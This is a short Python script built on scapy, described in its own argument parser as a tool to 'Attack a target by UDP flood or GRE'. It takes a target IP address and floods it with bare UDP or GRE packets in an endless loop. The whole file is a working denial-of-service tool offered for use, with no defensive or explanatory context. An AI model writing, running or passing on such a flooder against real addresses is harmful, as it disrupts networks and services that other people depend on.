import sys
import argparse
import os
from scapy.all import *

def gre(tgt_ip):
   
    p = IP(dst=tgt_ip)/GRE()
    print ("Sending GRE packets")
    while True:
        send(p, count = 100, verbose = 0)
def udp(tgt_ip):
    
    p = IP(dst=tgt_ip)/UDP()
    print ("Sending UPD packets")
    while True:
        send(p, count = 100, verbose = 0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Attack a target by UDP flood or GRE')
    parser.add_argument('ip', metavar = 'tgt_ip', nargs=1, action='store', help='target IP to attack')
    proto = parser.add_mutually_exclusive_group(required=True)
    proto.add_argument('-u', '-udp', '--u', '--udp', help='use UDP packets', action="store_true")
    proto.add_argument('-g', '-gre', '--g', '--gre', help='use GRE packets', action="store_true")
    args=parser.parse_args() 
    if args.u:
        print ("Targeting " +  args.ip[0] + " via UDP")
        udp(args.ip[0])
    elif args.g:
        print ("Targeting " +  args.ip[0] + " via GRE")
        gre(args.ip[0])
    else:
        print ("something happened")
